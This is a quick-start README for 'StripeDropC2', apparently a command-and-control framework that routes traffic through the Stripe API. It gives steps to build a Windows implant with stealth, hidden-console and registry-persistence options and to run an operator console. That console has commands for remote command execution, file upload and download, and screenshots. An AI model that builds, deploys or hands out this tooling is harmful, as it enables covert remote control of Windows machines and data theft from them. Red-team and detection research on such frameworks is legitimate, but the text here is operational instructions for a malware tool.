# Quick Start Guide

Get StripeDropC2 running in 5 minutes.

## Folder Structure
```
StripeDropC2/
├── implant/          # Windows agent (.NET C#)
├── operator/         # C2 server (Python)
└── docs/            # Full documentation
```

## Setup (One Time)

```bash
# 1. Clone
git clone https://github.com/infosecninja/StripeDropC2.git
cd StripeDropC2

# 2. Install Python dependencies
pip install stripe

# 3. Add your Stripe API key to BOTH files
nano operator/c2_config.py       # Line 10: API_KEY = "sk_test_YOUR_KEY"
nano operator/regenerate_key.py  # Line 28: YOUR_STRIPE_API_KEY = "sk_test_YOUR_KEY"

# 4. Generate encryption (REQUIRED before every build!)
cd operator
python3 regenerate_key.py
cd ..

# 5. Build implant
cd implant
dotnet publish Implant.csproj -c Release -r win-x64 \
  -p:DefineConstants="STEALTH_BALANCED;HIDE_CONSOLE;PERSIST_REGISTRY;ALLOW_DYNAMIC_CONFIG"
cd ..
```

## Run the Operator

```bash
cd operator
python3 c2_operator.py
```

## Operator Commands

```bash
implants                    # List all active implants
use <implant_id>           # Select implant
whoami                     # Execute command
upload local.txt remote.txt # Upload file
download remote.txt local.txt # Download file
screenshot                 # Capture screen
config                     # Show/modify settings
cleanup                    # Remove all Stripe objects
```

## Important Files

**Your binary:**
```
implant/bin/Release/net10.0/win-x64/publish/stripe.exe
```

**Verify no keys in binary:**
```bash
strings implant/bin/Release/net10.0/win-x64/publish/stripe.exe | grep "sk_test"
# Should return nothing!
```

## Security Reminders

✅ Use TEST keys only (sk_test_...)  
✅ Run `regenerate_key.py` before EVERY build  
✅ Never commit `implant/Implant.cs` after regeneration  
✅ Uncomment `# implant/Implant.cs` in `.gitignore` after first clone  
✅ Run `cleanup` command when done to remove Stripe objects  

## Need Help?

- Full docs: `docs/` folder
- Build details: `docs/BUILD_INSTRUCTIONS.md`
- Usage guide: `docs/USAGE.md`
- Architecture: `docs/ARCHITECTURE.md`
